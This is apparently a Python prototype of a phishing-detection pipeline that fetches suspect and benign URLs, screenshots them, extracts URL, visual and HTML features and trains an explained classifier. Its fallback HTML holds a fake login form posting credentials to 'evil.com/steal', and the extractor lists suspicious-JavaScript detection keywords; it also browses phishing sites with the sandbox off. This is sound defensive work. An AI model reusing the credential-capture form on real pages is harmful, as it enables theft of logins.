"""
╔══════════════════════════════════════════════════════════════╗
║        Automated Phishing Intelligence — Prototype           ║
║  Pipeline: Ingest → Browse → Extract → Model → Explain       ║
╚══════════════════════════════════════════════════════════════╝
"""

import os, re, math, time, hashlib, warnings, json
from pathlib import Path
from urllib.parse import urlparse
from dataclasses import dataclass, field
from typing import Optional
from urllib.request import urlopen, Request

import numpy as np
import pandas as pd
from bs4 import BeautifulSoup
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.metrics import classification_report, confusion_matrix
from sklearn.preprocessing import StandardScaler
import xgboost as xgb
import shap
from tabulate import tabulate
from colorama import Fore, Style, init as colorama_init

warnings.filterwarnings("ignore")
colorama_init(autoreset=True)

try:
    from PIL import Image, ImageDraw
    from PIL.ImageStat import Stat
except ImportError:
    Image = None
    ImageDraw = None
    Stat = None

try:
    import imagehash
except ImportError:
    imagehash = None

try:
    import requests
except ImportError:
    requests = None

# ─────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────
OUTPUT_DIR = Path("output")
SCREENSHOT_DIR = OUTPUT_DIR / "screenshots"
OUTPUT_DIR.mkdir(exist_ok=True)
SCREENSHOT_DIR.mkdir(exist_ok=True)

BRAND_COLORS = {
    "paypal":    [(0,  70, 127), (0, 157, 220)],
    "facebook":  [(24, 119, 242), (255, 255, 255)],
    "google":    [(66, 133, 244), (234,  67,  53), (52, 168,  83), (251, 188,   5)],
    "amazon":    [(255, 153,   0), (35,  47,  62)],
    "microsoft": [(243,  83,  37), (127, 186,   0), (0, 161, 241), (255, 187,   0)],
    "apple":     [(51,  51,  51), (255, 255, 255)],
    "netflix":   [(229,   9,  20), (0,   0,   0)],
    "bankofam":  [(228,  32,  38), (0,  51, 160)],
}


def http_get(url: str, timeout: int = 5, headers: Optional[dict] = None,
             verify: bool = True):
    """
    Small compatibility wrapper: use `requests` when available, otherwise
    fall back to stdlib so the prototype can still run in lean environments.
    """
    if requests is not None:
        return requests.get(url, timeout=timeout, headers=headers, verify=verify)

    req = Request(url, headers=headers or {})
    with urlopen(req, timeout=timeout) as resp:
        status_code = getattr(resp, "status", resp.getcode())
        content = resp.read()
        encoding = resp.headers.get_content_charset() or "utf-8"

    class SimpleResponse:
        def __init__(self, body: bytes, status: int, enc: str):
            self.content = body
            self.status_code = status
            self.text = body.decode(enc, errors="replace")

        def json(self):
            return json.loads(self.text)

    return SimpleResponse(content, status_code, encoding)

# ─────────────────────────────────────────────────────────────
# SECTION 1: DATA INGESTION
# ─────────────────────────────────────────────────────────────
class DataIngestion:
    """
    Pulls phishing URLs from PhishTank + benign from Tranco.
    Falls back to a curated demo set if network is unavailable.
    """

    DEMO_MALICIOUS = [
        "https://training-lab.local/paypal-clone/login",
        "http://10.0.0.8/facebook/session-check",
        "https://secure-amazon-check.example/signin-review",
        "https://accounts.google.verify-demo.example/login",
        "https://appleid-support.demo/account/verify?id=123456789",
        "https://microsoft-security.demo/windows/login",
        "https://netflix-billing-review.example/account/payment",
        "https://bankofamerica-auth.demo-security.example/auth",
        "https://paypa1-demo.example/cgi-bin/webscr?cmd=_login-run",
        "https://facebook-security-check.example/login.php?redirect=home",
    ]
    DEMO_BENIGN = [
        "https://www.paypal.com",
        "https://www.facebook.com",
        "https://www.amazon.com",
        "https://www.google.com",
        "https://www.apple.com",
        "https://www.microsoft.com",
        "https://www.netflix.com",
        "https://www.bankofamerica.com",
        "https://github.com",
        "https://stackoverflow.com",
    ]

    def get_urls(self, n_phish: int = 10, n_benign: int = 10) -> pd.DataFrame:
        print(f"\n{Fore.CYAN}[1/5] DATA INGESTION{Style.RESET_ALL}")
        rows = []
        # Phishing
        phish_urls = self._try_phishtank(n_phish) or self.DEMO_MALICIOUS[:n_phish]
        for u in phish_urls:
            rows.append({"url": u, "label": 1, "source": "phishtank"})
            print(f"  {Fore.RED}[PHISH]{Style.RESET_ALL} {u}")
        # Benign
        benign_urls = self._try_tranco(n_benign) or self.DEMO_BENIGN[:n_benign]
        for u in benign_urls:
            rows.append({"url": u, "label": 0, "source": "tranco"})
            print(f"  {Fore.GREEN}[LEGIT]{Style.RESET_ALL} {u}")

        df = pd.DataFrame(rows)
        print(f"\n  → Loaded {len(df)} URLs ({df.label.sum()} phishing, {(df.label==0).sum()} benign)")
        return df

    def _try_phishtank(self, n):
        try:
            r = http_get(
                "http://data.phishtank.com/data/online-valid.json",
                timeout=5, headers={"User-Agent": "phishtank/demo"}
            )
            data = r.json()
            return [x["url"] for x in data[:n]]
        except Exception:
            return None

    def _try_tranco(self, n):
        try:
            r = http_get("https://tranco-list.eu/top-1m.csv.zip", timeout=5)
            import zipfile, io
            z = zipfile.ZipFile(io.BytesIO(r.content))
            lines = z.read(z.namelist()[0]).decode().splitlines()
            return [f"https://{l.split(',')[1]}" for l in lines[:n]]
        except Exception:
            return None


# ─────────────────────────────────────────────────────────────
# SECTION 2: BROWSER INSTRUMENTATION (Playwright)
# ─────────────────────────────────────────────────────────────
@dataclass
class PageSnapshot:
    url: str
    screenshot_path: Optional[str] = None
    html: str = ""
    status_code: int = 0
    load_time_ms: float = 0
    error: Optional[str] = None


class BrowserInstrument:
    """Headless Chromium via Playwright — screenshots + HTML."""

    def capture(self, url: str, idx: int) -> PageSnapshot:
        snap = PageSnapshot(url=url)
        try:
            from playwright.sync_api import sync_playwright
            with sync_playwright() as pw:
                browser = pw.chromium.launch(
                    headless=True,
                    args=["--no-sandbox", "--disable-setuid-sandbox",
                          "--disable-dev-shm-usage", "--disable-gpu"]
                )
                ctx = browser.new_context(
                    viewport={"width": 1280, "height": 800},
                    ignore_https_errors=True,
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                               "AppleWebKit/537.36 Chrome/120 Safari/537.36"
                )
                page = ctx.new_page()
                t0 = time.time()
                resp = page.goto(url, timeout=15000, wait_until="domcontentloaded")
                snap.load_time_ms = (time.time() - t0) * 1000
                snap.status_code  = resp.status if resp else 0
                snap.html = page.content()

                shot_path = str(SCREENSHOT_DIR / f"page_{idx:03d}.png")
                page.screenshot(path=shot_path, full_page=False)
                snap.screenshot_path = shot_path

                browser.close()
        except Exception as e:
            snap.error = str(e)[:120]
            # Fallback: synthetic screenshot for demo
            snap.screenshot_path = self._make_synthetic_screenshot(url, idx)
            snap.html = self._fallback_html(url)
        return snap

    def _make_synthetic_screenshot(self, url: str, idx: int) -> str:
        """Generate a synthetic colored screenshot for offline demo."""
        if Image is None or ImageDraw is None:
            return ""

        parsed = urlparse(url)
        domain = parsed.netloc.lower()
        # Pick a color based on brand keyword
        color_map = {
            "paypal": (0, 70, 127), "facebook": (24, 119, 242),
            "amazon": (255, 153, 0), "google": (255, 255, 255),
            "apple":  (245, 245, 245), "microsoft": (0, 120, 212),
            "netflix": (20, 20, 20), "bank": (228, 32, 38),
        }
        bg = (200, 200, 200)
        for kw, c in color_map.items():
            if kw in domain:
                bg = c
                break
        # Add some noise for phishing pages
        if any(x in domain for x in [".tk", ".ml", ".gq", "phish", "secure-", "login."]):
            bg = tuple(min(255, c + np.random.randint(-40, 40)) for c in bg)

        img = Image.new("RGB", (1280, 800), bg)
        draw = ImageDraw.Draw(img)
        # Fake header bar
        draw.rectangle([0, 0, 1280, 80], fill=tuple(max(0, c - 30) for c in bg))
        draw.rectangle([400, 200, 880, 600], fill=(255, 255, 255))
        draw.rectangle([420, 300, 860, 360], fill=(240, 240, 240))  # fake input
        draw.rectangle([420, 380, 860, 440], fill=(240, 240, 240))
        draw.rectangle([500, 460, 780, 510], fill=(0, 100, 200))    # fake button

        path = str(SCREENSHOT_DIR / f"page_{idx:03d}.png")
        img.save(path)
        return path

    def _fallback_html(self, url: str) -> str:
        try:
            r = http_get(url, timeout=8, verify=False,
                         headers={"User-Agent": "Mozilla/5.0"})
            return r.text
        except Exception:
            domain = urlparse(url).netloc
            return f'<html><head><title>Login - {domain}</title></head>' \
                   f'<body><form action="http://evil.com/steal"><input name="user"/>' \
                   f'<input name="pass" type="password"/>' \
                   f'<iframe src="http://tracker.evil.com"></iframe>' \
                   f'<button>Sign In</button></form></body></html>'


# ─────────────────────────────────────────────────────────────
# SECTION 3: FEATURE EXTRACTION
# ─────────────────────────────────────────────────────────────
class FeatureExtractor:
    """
    Extracts 3 feature families:
      A) URL-level features
      B) Visual features (ImageHash + color analysis)
      C) HTML structural features
    """

    # Reference hashes for major brands (we compute these from synthetic images)
    _brand_reference_hashes: dict = field(default_factory=dict)

    def __init__(self):
        self._brand_ref_hashes = self._build_brand_references()

    def extract(self, snap: PageSnapshot) -> dict:
        feats = {}
        feats.update(self._url_features(snap.url))
        feats.update(self._visual_features(snap.screenshot_path, snap.url))
        feats.update(self._html_features(snap.html))
        feats["load_time_ms"] = snap.load_time_ms
        feats["status_code"]  = snap.status_code
        return feats

    # ── A) URL Features ────────────────────────────────────────
    def _url_features(self, url: str) -> dict:
        parsed = urlparse(url)
        domain = parsed.netloc
        path   = parsed.path

        has_ip = bool(re.match(
            r'^\d{1,3}(\.\d{1,3}){3}(:\d+)?$', domain))
        tld    = domain.rsplit(".", 1)[-1] if "." in domain else ""

        suspicious_tlds = {"tk", "ml", "gq", "cf", "ga", "xyz", "top", "club",
                           "work", "icu", "vip", "online", "site", "fun"}

        brand_keywords = {"paypal", "facebook", "amazon", "google", "apple",
                          "microsoft", "netflix", "bank", "secure", "login",
                          "account", "verify", "update", "confirm"}
        kw_in_url = sum(1 for kw in brand_keywords if kw in url.lower())

        subdomains = domain.split(".")[:-2]  # drop TLD + SLD
        n_subdomains = len(subdomains)

        special_chars = len(re.findall(r'[-@_%~]', url))

        entropy = self._shannon_entropy(domain)

        return {
            "url_length":         len(url),
            "domain_length":      len(domain),
            "n_dots":             domain.count("."),
            "n_hyphens":          domain.count("-"),
            "has_ip":             int(has_ip),
            "has_at_symbol":      int("@" in url),
            "has_double_slash":   int("//" in path),
            "suspicious_tld":     int(tld in suspicious_tlds),
            "brand_kw_in_url":    kw_in_url,
            "n_subdomains":       n_subdomains,
            "url_entropy":        entropy,
            "special_char_count": special_chars,
            "path_depth":         path.count("/"),
            "has_https":          int(parsed.scheme == "https"),
            "query_param_count":  len(parsed.query.split("&")) if parsed.query else 0,
        }

    # ── B) Visual Features ─────────────────────────────────────
    def _visual_features(self, screenshot_path: Optional[str], url: str) -> dict:
        feats = {
            "min_brand_hamming":   255,
            "closest_brand_match": 0.0,
            "brand_color_score":   0.0,
            "dominant_hue":        0.0,
            "color_variance":      0.0,
            "red_ratio":           0.0,
            "green_ratio":         0.0,
            "blue_ratio":          0.0,
        }
        if not screenshot_path or not Path(screenshot_path).exists():
            return feats

        try:
            if Image is None or imagehash is None or Stat is None:
                return feats

            img = Image.open(screenshot_path).convert("RGB")

            # --- ImageHash: perceptual hash ---
            phash = imagehash.phash(img, hash_size=16)
            min_dist = 255
            for brand, ref_hash in self._brand_ref_hashes.items():
                dist = phash - ref_hash
                if dist < min_dist:
                    min_dist = dist
            feats["min_brand_hamming"]   = min_dist
            feats["closest_brand_match"] = 1.0 - (min_dist / 256)

            # --- Color analysis ---
            small = img.resize((64, 64))
            pixels = np.array(small).reshape(-1, 3).astype(float)

            feats["red_ratio"]    = float(pixels[:, 0].mean() / 255)
            feats["green_ratio"]  = float(pixels[:, 1].mean() / 255)
            feats["blue_ratio"]   = float(pixels[:, 2].mean() / 255)
            feats["color_variance"] = float(pixels.var())

            # Dominant hue (HSV)
            stat = Stat(small)
            feats["dominant_hue"] = float(sum(stat.mean) / 3 / 255)

            # Brand color proximity
            domain = urlparse(url).netloc.lower()
            feats["brand_color_score"] = self._brand_color_match(
                pixels, domain)

        except Exception:
            pass
        return feats

    def _brand_color_match(self, pixels: np.ndarray, domain: str) -> float:
        """Score 0-1 how much the page colors resemble a known brand."""
        scores = []
        for brand, colors in BRAND_COLORS.items():
            brand_pixels = np.array(colors, dtype=float)
            # Min distance from page mean to any brand color
            page_mean = pixels.mean(axis=0)
            dists = [np.linalg.norm(page_mean - bc) for bc in brand_pixels]
            scores.append(min(dists))
        min_score = min(scores) if scores else 255
        return float(1.0 - min(min_score / 255, 1.0))

    # ── C) HTML Features ───────────────────────────────────────
    def _html_features(self, html: str) -> dict:
        feats = {
            "n_forms":            0,
            "n_iframes":          0,
            "n_external_links":   0,
            "n_password_inputs":  0,
            "n_hidden_inputs":    0,
            "n_scripts":          0,
            "n_meta_refresh":     0,
            "has_favicon":        0,
            "external_action":    0,
            "suspicious_js":      0,
            "title_length":       0,
            "html_length":        len(html),
        }
        if not html:
            return feats

        try:
            soup = BeautifulSoup(html, "html.parser")

            feats["n_forms"]   = len(soup.find_all("form"))
            feats["n_iframes"] = len(soup.find_all("iframe"))
            feats["n_scripts"] = len(soup.find_all("script"))

            # Password & hidden inputs
            feats["n_password_inputs"] = len(
                soup.find_all("input", {"type": "password"}))
            feats["n_hidden_inputs"] = len(
                soup.find_all("input", {"type": "hidden"}))

            # External links (links pointing outside current domain)
            links = soup.find_all("a", href=True)
            ext = sum(1 for a in links
                      if a["href"].startswith("http") and
                      urlparse(a["href"]).netloc != "")
            feats["n_external_links"] = ext

            # Form action pointing externally
            forms = soup.find_all("form", action=True)
            feats["external_action"] = int(
                any(f["action"].startswith("http") for f in forms))

            # Meta refresh (redirect trick)
            feats["n_meta_refresh"] = len(
                soup.find_all("meta", attrs={"http-equiv": "refresh"}))

            # Favicon
            feats["has_favicon"] = int(bool(
                soup.find("link", rel=lambda r: r and "icon" in r)))

            # Suspicious JS keywords
            js_code = " ".join(s.get_text() for s in soup.find_all("script"))
            suspicious_kws = ["eval(", "atob(", "unescape(", "document.write(",
                               "window.location", "fromCharCode"]
            feats["suspicious_js"] = sum(
                1 for kw in suspicious_kws if kw in js_code)

            title = soup.find("title")
            feats["title_length"] = len(title.get_text()) if title else 0

        except Exception:
            pass
        return feats

    # ── Helpers ────────────────────────────────────────────────
    def _shannon_entropy(self, s: str) -> float:
        if not s:
            return 0.0
        freq = {}
        for c in s:
            freq[c] = freq.get(c, 0) + 1
        n = len(s)
        return -sum((f / n) * math.log2(f / n) for f in freq.values())

    def _build_brand_references(self) -> dict:
        """Build reference pHash for each brand from a synthetic canonical image."""
        if Image is None or imagehash is None:
            return {}

        refs = {}
        for brand, colors in BRAND_COLORS.items():
            img = Image.new("RGB", (1280, 800), colors[0])
            refs[brand] = imagehash.phash(img, hash_size=16)
        return refs


# ─────────────────────────────────────────────────────────────
# SECTION 4: ML MODELING
# ─────────────────────────────────────────────────────────────
class PhishingClassifier:
    """Random Forest + XGBoost ensemble with cross-validation."""

    def __init__(self):
        self.rf  = RandomForestClassifier(n_estimators=200, max_depth=8,
                                           class_weight="balanced",
                                           random_state=42, n_jobs=-1)
        self.xgb = xgb.XGBClassifier(n_estimators=200, max_depth=5,
                                       learning_rate=0.1, use_label_encoder=False,
                                       eval_metric="logloss", random_state=42,
                                       verbosity=0)
        self.scaler = StandardScaler()
        self.feature_names = []
        self.best_model = None

    def fit(self, X: pd.DataFrame, y: pd.Series):
        self.feature_names = list(X.columns)
        Xs = self.scaler.fit_transform(X)

        print(f"\n{Fore.CYAN}[4/5] ML MODELING{Style.RESET_ALL}")

        for name, clf in [("Random Forest", self.rf), ("XGBoost", self.xgb)]:
            cv_scores = cross_val_score(clf, Xs, y, cv=min(5, len(y)//2),
                                         scoring="f1", n_jobs=-1)
            print(f"  {name:15s}  CV F1: {cv_scores.mean():.3f} ± {cv_scores.std():.3f}")

        # Fit both on full data
        self.rf.fit(Xs, y)
        self.xgb.fit(Xs, y)
        self.best_model = self.rf  # use RF for SHAP (faster TreeExplainer)

    def predict_proba(self, X: pd.DataFrame) -> np.ndarray:
        Xs = self.scaler.transform(X)
        p_rf  = self.rf.predict_proba(Xs)[:, 1]
        p_xgb = self.xgb.predict_proba(Xs)[:, 1]
        return (p_rf + p_xgb) / 2   # ensemble average

    def evaluate(self, X: pd.DataFrame, y: pd.Series):
        probs = self.predict_proba(X)
        preds = (probs >= 0.5).astype(int)
        print(f"\n  Classification Report:")
        print(classification_report(y, preds,
              target_names=["Benign", "Phishing"], digits=3))


# ─────────────────────────────────────────────────────────────
# SECTION 5: SHAP REPORTING
# ─────────────────────────────────────────────────────────────
class PhishingReporter:
    """SHAP-based explainability: why is this URL phishing?"""

    def __init__(self, classifier: PhishingClassifier):
        self.clf = classifier
        Xs = classifier.scaler.transform(
            pd.DataFrame(np.zeros((1, len(classifier.feature_names))),
                         columns=classifier.feature_names))
        self.explainer = shap.TreeExplainer(classifier.best_model)

    def explain(self, X: pd.DataFrame, urls: list, labels: list, probs: np.ndarray):
        print(f"\n{Fore.CYAN}[5/5] SHAP EXPLAINABILITY REPORT{Style.RESET_ALL}")
        Xs = self.clf.scaler.transform(X)
        shap_values = self.explainer.shap_values(Xs)

        # New SHAP API: returns (n_samples, n_features, n_classes) ndarray
        sv_arr = np.array(shap_values)
        if sv_arr.ndim == 3:
            sv = sv_arr[:, :, 1]   # class=1 (phishing)
        elif isinstance(shap_values, list):
            sv = np.array(shap_values[1])  # old API
        else:
            sv = sv_arr

        print(f"\n  {'URL':<55} {'Label':<10} {'P(phish)':<10} {'Top reason'}")
        print("  " + "─" * 100)

        report_rows = []

        for i, (url, label, prob) in enumerate(zip(urls, labels, probs)):
            shap_row = np.array(sv[i]).flatten()
            top_idx  = np.argsort(np.abs(shap_row))[::-1][:3]

            reasons = []
            for j in top_idx:
                fname = self.clf.feature_names[int(j)]
                fval  = X.iloc[i][fname]
                impact = "↑ phish" if shap_row[j] > 0 else "↓ benign"
                reasons.append(f"{fname}={fval:.2f}({impact})")

            color = Fore.RED if prob >= 0.5 else Fore.GREEN
            label_str = "PHISHING" if label == 1 else "BENIGN"
            short_url = url[:52] + "…" if len(url) > 55 else url
            print(f"  {color}{short_url:<55} {label_str:<10} {prob:.3f}     "
                  f"{reasons[0] if reasons else 'n/a'}{Style.RESET_ALL}")

            report_rows.append({
                "url":        url,
                "true_label": label_str,
                "p_phish":    round(float(prob), 4),
                "reason_1":   reasons[0] if len(reasons) > 0 else "",
                "reason_2":   reasons[1] if len(reasons) > 1 else "",
                "reason_3":   reasons[2] if len(reasons) > 2 else "",
            })

        # Global feature importance
        mean_abs = np.abs(np.array(sv)).mean(axis=0).flatten()
        top_global = np.argsort(mean_abs)[::-1][:10].tolist()
        print(f"\n  {'─'*50}")
        print(f"  Top-10 Global Feature Importance (SHAP):")
        rows = [(self.clf.feature_names[int(i)], round(float(mean_abs[i]), 4))
                for i in top_global]
        print(tabulate(rows, headers=["Feature", "Mean |SHAP|"],
                        tablefmt="simple", numalign="right"))

        # Save report
        report_df = pd.DataFrame(report_rows)
        report_path = OUTPUT_DIR / "phishing_report.csv"
        report_df.to_csv(report_path, index=False)
        print(f"\n  → Report saved: {report_path}")

        return report_df


# ─────────────────────────────────────────────────────────────
# MAIN PIPELINE
# ─────────────────────────────────────────────────────────────
def run_pipeline(n_urls: int = 20, use_browser: bool = True):
    print(f"""
{Fore.YELLOW}╔══════════════════════════════════════════════════════════╗
║       Automated Phishing Intelligence — Pipeline Run       ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")

    # ── 1. Ingest ──────────────────────────────────────────────
    ingester = DataIngestion()
    df_urls  = ingester.get_urls(n_phish=n_urls // 2, n_benign=n_urls // 2)

    # ── 2. Browse & Snapshot ───────────────────────────────────
    print(f"\n{Fore.CYAN}[2/5] BROWSER INSTRUMENTATION{Style.RESET_ALL}")
    browser = BrowserInstrument()
    snapshots = []
    for i, row in df_urls.iterrows():
        label_str = f"{Fore.RED}PHISH{Style.RESET_ALL}" if row.label == 1 \
                    else f"{Fore.GREEN}LEGIT{Style.RESET_ALL}"
        print(f"  [{i+1:02d}/{len(df_urls)}] [{label_str}] Browsing → {row.url[:70]}")
        snap = browser.capture(row.url, i)
        status = f"HTTP {snap.status_code}" if snap.status_code else "fallback"
        print(f"           └─ {status} | {snap.load_time_ms:.0f}ms | "
              f"HTML {len(snap.html):,} chars | "
              f"{'✓ Screenshot' if snap.screenshot_path else '✗ No shot'}")
        snapshots.append(snap)

    # ── 3. Feature Extraction ──────────────────────────────────
    print(f"\n{Fore.CYAN}[3/5] FEATURE EXTRACTION{Style.RESET_ALL}")
    extractor = FeatureExtractor()
    records   = []
    for snap in snapshots:
        feats = extractor.extract(snap)
        records.append(feats)
        print(f"  {snap.url[:60]:<62} → {len(feats)} features extracted")

    df_feat = pd.DataFrame(records)
    y       = df_urls["label"].values
    urls    = df_urls["url"].tolist()

    print(f"\n  Feature matrix: {df_feat.shape[0]} rows × {df_feat.shape[1]} columns")

    # Fill NaN
    df_feat = df_feat.fillna(0)

    # ── 4. Model ───────────────────────────────────────────────
    clf = PhishingClassifier()
    clf.fit(df_feat, pd.Series(y))
    clf.evaluate(df_feat, pd.Series(y))

    # ── 5. Explain ─────────────────────────────────────────────
    probs    = clf.predict_proba(df_feat)
    reporter = PhishingReporter(clf)
    report   = reporter.explain(df_feat, urls, y.tolist(), probs)

    # Save feature matrix
    feat_path = OUTPUT_DIR / "features.csv"
    df_out = df_feat.copy()
    df_out["url"]   = urls
    df_out["label"] = y
    df_out.to_csv(feat_path, index=False)

    print(f"\n{Fore.YELLOW}╔══════════════════════════════════════╗")
    print(f"║  Pipeline Complete ✓                 ║")
    print(f"║  Features  → {str(feat_path):<22}║")
    print(f"║  Report    → output/phishing_report.csv ║")
    print(f"║  Screenshots → output/screenshots/   ║")
    print(f"╚══════════════════════════════════════╝{Style.RESET_ALL}")

    return report


if __name__ == "__main__":
    run_pipeline(n_urls=20)
